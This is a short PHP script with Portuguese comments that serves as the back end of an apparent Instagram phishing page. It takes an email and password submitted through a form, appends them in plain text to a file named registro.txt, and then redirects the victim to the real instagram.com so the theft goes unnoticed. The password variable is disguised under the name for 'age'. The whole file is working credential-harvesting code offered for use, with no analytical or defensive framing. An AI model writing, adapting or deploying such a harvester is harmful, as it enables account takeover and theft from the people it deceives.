<?php
//PEGA OS DADOS ENVIADOS PELO FORMULÁRIO
$nome	=	$_POST["txt_mail"];
$idade	=	$_POST["txt_senha"];

//PREPARA O CONTEÚDO A SER GRAVADO
$conteudo	=	"email: $nome / senha: $idade\r\n";

//ARQUIVO TXT
$arquivo	= "registro.txt";

//TENTA ABRIR O ARQUIVO TXT
if (!$abrir = fopen($arquivo, "a")) {
        echo  "Erro abrindo arquivo ($arquivo)";
        exit;
}

//ESCREVE NO ARQUIVO TXT
if (!fwrite($abrir, $conteudo)) {
       print "Erro escrevendo no arquivo ($arquivo)";
       exit;
}

//echo "Arquivo gravado com sucesso!";

 $redirect = "http://instagram.com";

 #abaixo, chamamos a função header() com o atributo location: apontando para a variavel $redirect, que por
 #sua vez aponta para o endereço de onde ocorrerá o redirecionamento
 header("location:$redirect");

//FECHA O ARQUIVO
fclose($abrir);
?>
